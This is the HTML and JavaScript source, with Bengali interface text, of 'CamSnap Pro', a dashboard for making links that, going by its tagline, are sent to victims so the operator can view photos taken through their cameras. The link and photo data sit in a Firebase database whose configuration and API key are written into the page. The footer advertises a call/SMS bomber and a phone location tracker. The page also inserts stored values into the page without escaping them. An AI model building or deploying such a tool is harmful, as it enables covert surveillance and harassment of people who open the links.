<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CamSnap Pro • Dashboard</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
    body{background:#f8f9fc;color:#222;min-height:100vh;display:flex;flex-direction:column;}
    header{background:#fff;padding:15px;text-align:center;box-shadow:0 3px 12px rgba(0,0,0,0.06);}
    header img{height:65px;border-radius:14px;max-width:85%;}
    
    main{flex:1;max-width:560px;margin:15px auto;padding:0 12px;width:100%;}
    .card{background:#fff;border-radius:26px;padding:30px 24px;box-shadow:0 12px 40px rgba(0,0,0,0.1);text-align:center;border:1px solid #eaeaea;}
    h1{font-size:2.1em;margin-bottom:10px;color:#1a1a1a;}
    p{font-size:1.05em;color:#555;line-height:1.6;margin-bottom:25px;}
    
    /* YouTube থাম্বনেইল */
    .thumbnail{
      width:100%;
      max-width:480px;
      margin:20px auto;
      border-radius:16px;
      box-shadow:0 8px 25px rgba(0,0,0,0.15);
      display:block;
    }
    
    button{background:#0066ff;color:#fff;border:none;padding:18px;font-size:1.4em;border-radius:18px;width:100%;cursor:pointer;font-weight:600;box-shadow:0 8px 25px rgba(0,102,255,0.35);}
    button:hover{background:#0052cc;transform:translateY(-3px);}

    #linksList{margin-top:30px;}
    .link-item{
      position:relative;
      background:#fff;
      border:1px solid #e0e7ff;
      border-radius:16px;
      padding:16px 18px;
      margin:12px 0;
      box-shadow:0 4px 15px rgba(0,102,255,0.08);
      transition:0.3s;
    }
    .link-item:hover{border-color:#0066ff;transform:translateY(-3px);}
    
    .delete-btn{
      position:absolute;top:10px;right:12px;
      background:#ff4444;color:#fff;width:38px;height:38px;border-radius:50%;
      border:none;font-size:20px;cursor:pointer;box-shadow:0 4px 12px rgba(255,68,68,0.4);
      transition:0.3s;display:flex;align-items:center;justify-content:center;
    }
    .delete-btn:hover{background:#cc0000;transform:scale(1.1);}

    .link-id{font-size:1.1em;font-weight:700;color:#0066ff;margin-bottom:4px;}
    .link-url{font-size:0.95em;color:#444;word-break:break-all;line-height:1.4;margin:8px 0;}
    .link-actions{display:flex;gap:10px;margin-top:8px;}
    .link-actions button{flex:1;padding:9px;font-size:0.92em;border-radius:10px;font-weight:600;}
    .copyBtn{background:#fff;color:#0066ff;border:2px solid #0066ff;}
    .copyBtn:hover{background:#0066ff;color:#fff;}
    .viewBtn{background:#0066ff;color:#fff;}
    .created{font-size:0.85em;color:#888;margin-top:6px;display:block;}

    /* ফুটার – বামে সারি সারি + মোবাইল ফ্রেন্ডলি */
    footer{background:#0a1a2f;color:#b0c4de;padding:50px 20px;text-align:left;}
    .footer-content{max-width:1200px;margin:0 auto;display:flex;flex-wrap:wrap;gap:50px;justify-content:flex-start;}
    .footer-col h4{color:#00ccff;margin-bottom:18px;font-size:1.15em;position:relative;padding-bottom:10px;}
    .footer-col h4::after{content:'';position:absolute;left:0;bottom:0;width:45px;height:3px;background:#0066ff;border-radius:2px;}
    .footer-col a{color:#b0c4de;display:block;margin:12px 0;text-decoration:none;transition:0.3s;font-size:0.98em;}
    .footer-col a:hover{color:#fff;padding-left:10px;}
    .telegram-link{background:#0088cc;color:#fff;padding:10px 20px;border-radius:10px;display:inline-block;margin-top:10px;font-weight:600;}
    .copyright{width:100%;text-align:center;margin-top:40px;padding-top:25px;border-top:1px solid #1e2a44;color:#8899aa;font-size:0.9em;}

    @media (max-width:480px){
      h1{font-size:1.9em;}
      .thumbnail{max-width:100%;}
      button{font-size:1.3em;padding:16px;}
      .link-item{padding:14px;}
      .footer-content{justify-content:center;gap:35px;}
      .footer-col{text-align:center;}
      .footer-col h4::after{left:50%;transform:translateX(-50%);}
    }
  </style>
</head>
<body>

<header>
  <img src="https://raw.githubusercontent.com/shakib0122222/camnei/8ad3b81b56f353f490397fc5a03c41daea82cd7f/20251130_085522.png" alt="CamSnap">
</header>

<main>
  <div class="card">
    <h1>CamSnap Pro</h1>
    <p>নতুন লিংক বানাও → পাঠাও → ভিউ করে ছবি দেখো!</p>

    <!-- YouTube থাম্বনেইল – লিংক দিয়ে চেঞ্জ করতে পারো -->
    <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" alt="Demo Thumbnail" class="thumbnail">

    <button onclick="createLink()">নতুন লিংক তৈরি করুন</button>

    <div id="linksList"></div>
  </div>
</main>

<!-- ফুটার – বামে সারি সারি -->
<footer>
  <div class="footer-content">
    <div class="footer-col">
      <h4>Get More Free Services</h4>
      <a href="#">Number Location Tracker</a>
      <a href="#">CALL/SMS Bomber</a>
      <a href="#">Company</a>
    </div>
    <div class="footer-col">
      <h4>Quick Links</h4>
      <a href="#">About Us</a>
      <a href="#">Contact</a>
      <a href="#">FAQ</a>
    </div>
    <div class="footer-col">
      <h4>Legal Pages</h4>
      <a href="#">Terms of Use</a>
      <a href="#">Privacy Policy</a>
      <a href="#">Disclaimer</a>
    </div>
    <div class="footer-col">
      <h4>Contact</h4>
      <a href="https://t.me/yourchannel" target="_blank" class="telegram-link">Telegram Support</a>
    </div>
  </div>
  <div class="copyright">
    © 2025 X4XOR. All rights reserved
  </div>
</footer>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
  authDomain: "cam-snap-8e956.firebaseapp.com",
  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
  projectId: "cam-snap-8e956",
  storageBucket: "cam-snap-8e956.firebasestorage.app",
  messagingSenderId: "982089892260",
  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131",
  measurementId: "G-S5S37F55T6"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const linksRef = db.ref('links');

function createLink() {
  const id = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
  const url = location.origin + location.pathname + id;

  linksRef.child(id).set({
    url: url,
    created: new Date().toLocaleString('bn-BD'),
    sessions: {}
  }).then(() => alert("লিংক তৈরি হয়েছে!"));
}

function copyLink(url) {
  navigator.clipboard.writeText(url);
  alert("কপি হয়ে গেছে!");
}

function deleteLink(id) {
  if (confirm("ডিলিট করবেন?")) {
    linksRef.child(id).remove();
  }
}

linksRef.on('value', (snap) => {
  const data = snap.val();
  const container = document.getElementById("linksList");
  container.innerHTML = "";

  if (!data || Object.keys(data).length === 0) return;

  Object.keys(data).sort((a,b) => b.localeCompare(a)).forEach(id => {
    const item = data[id];
    const total = Object.values(item.sessions || {}).reduce((a, s) => a + (s.photos?.length || 0), 0);

    container.innerHTML += `
      <div class="link-item">
        <button class="delete-btn" onclick="deleteLink('${id}')">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <polyline points="3 6 5 6 21 6"></polyline>
            <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path>
            <line x1="10" y1="11" x2="10" y2="17"></line>
            <line x1="14" y1="11" x2="14" y2="17"></line>
          </svg>
        </button>
        <div class="link-id">ID: ${id}</div>
        <div class="link-url">${item.url}</div>
        <div class="link-actions">
          <button class="copyBtn" onclick="copyLink('${item.url}')">কপি</button>
          <a href="viewer.html?id=${id}" target="_blank">
            <button class="viewBtn">ভিউ করুন (${total})</button>
          </a>
        </div>
        <small class="created">তৈরি: ${item.created}</small>
      </div>
    `;
  });
});
</script>
</body>
</html>
